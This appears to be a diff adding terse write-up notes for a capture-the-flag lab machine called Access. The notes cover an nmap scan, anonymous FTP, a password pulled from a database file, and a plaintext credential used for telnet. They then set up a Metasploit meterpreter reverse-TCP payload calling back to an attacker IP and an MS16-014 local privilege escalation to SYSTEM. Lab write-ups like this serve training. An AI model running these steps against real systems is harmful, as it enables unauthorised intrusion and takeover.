@@ -1,0 +1,72 @@
+Level: Easy
+
+Task: To find user.txt and root.txt file
+
+Note: Since these labs are online they have a static IP. The IP of Access is 10.10.10.98.
+
+---
+
+scanned network to find target
+
+nmap -p- -A 10.10.10.98
+
+discovered anonymous access to ftp server
+
+logged into ftp server
+
+downloaded access control.zip & backup.mdb
+
+ftp 10.10.10.98
+
+cant unzip file - password protected
+backup.mdb file provides pw
+
+strings backup.mdb | grep access
+
+unzip access control.zip
+
+access control.zip holds user credentials
+
+Username- security
+Password- 4Cc3ssC0ntr0ller
+
+login to telnet 
+
+telnet 10.10.10.98
+dir
+cd Desktop
+type user.txt
+
+created shellcode via metasploit
+
+use exploit/multi/script/web_delivery
+set target 2
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.14.6
+exploit
+
+execute & got meterpreter
+
+getuid
+getsystem
+sysinfo
+
+used exploit suggester
+
+use post/multi/recon/local_exploit_suggester
+set session 1
+exploit
+
+used exploit  ms16_014_wmirecv_notif  of metasploit
+
+use exploit/windows/local/ms16_014_wmi_recv_notif
+set lhost 10.10.14.6
+set session 1
+set lport 1234
+exploit
+
+root access: whoami
+
+change password for Administrator 
+
+successfully login via telnet
